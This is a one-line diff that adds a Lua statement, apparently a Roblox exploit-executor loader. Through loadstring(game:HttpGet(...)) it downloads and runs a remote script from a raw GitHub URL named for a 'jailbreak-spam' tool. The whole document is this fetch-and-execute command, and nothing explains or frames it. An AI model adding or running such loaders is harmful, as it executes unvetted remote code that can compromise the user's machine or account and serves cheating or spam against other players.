@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/codefinchpalace/loaders/main/loaders/jailbreak-spam4-01mhjt25gy5yt9.lua"))()
